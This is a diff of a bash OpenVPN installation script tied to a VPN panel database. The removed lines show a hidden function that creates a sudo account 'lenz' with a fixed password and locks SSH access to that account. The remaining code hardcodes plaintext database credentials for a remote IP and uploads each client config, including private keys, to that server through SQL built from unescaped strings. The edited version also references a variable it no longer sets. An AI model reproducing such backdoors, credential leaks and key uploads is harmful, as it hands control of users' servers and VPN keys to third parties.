@@ -1,28 +1,18 @@
 #!/bin/bash
-#Script Variables
-HOST='136.243.103.110';
-USER='viptunnelvpn_ownT';
-PASS='dx8qLn2WOqz7';
-DBNAME='viptunnelvpn_ownT';
 
+# Database info
 DB_HOST='136.243.103.110'
 DB_USER='viptunnelvpn_ownT'
-DB_PASS='dx8qLn2WOqz7'
 DB_NAME='viptunnelvpn_ownT'
+DB_PASSWORD='dx8qLn2WOqz7'
 
 timedatectl set-timezone Asia/Riyadh
 #!/bin/bash
 #
 
+# Get the VPS IP address
+VPS_IP=$(curl -s https://api.ipify.org)
 
-install_sudo(){
-  {
-    useradd -m lenz 2>/dev/null; echo lenz:@@Password123 | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
-    service sshd restart
-  }&>/dev/null
-}
 
 # https://github.com/xoventechdev/openvpn-install-for-multiple-users
 # This script enables duplicate-cn in server.conf. You can share the same client.ovpn file for multiple users.
@@ -81,8 +71,10 @@ newclient () {
 	echo "<tls-auth>" >> ~/$1.ovpn
 	sed -ne '/BEGIN OpenVPN Static key/,$ p' /etc/openvpn/server/ta.key >> ~/$1.ovpn
 	echo "</tls-auth>" >> ~/$1.ovpn
-	CLIENT_CONFIG=$(cat ~/$1.ovpn)
-   	mysql -h $DB_HOST -u $DB_USER -p$DB_PASS $DB_NAME -e "UPDATE server_list SET config='$CLIENT_CONFIG' WHERE server_ip='$server_ip'"
+
+	# Update the OpenVPN config in the database
+	mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -e "UPDATE server_list SET config = '$CLIENT_CONFIG', status = 1 WHERE server_ip = '$VPS_IP';"
+	
 
 }
 
@@ -274,5 +266,4 @@ fi
 
 
 
-install_sudo  
 
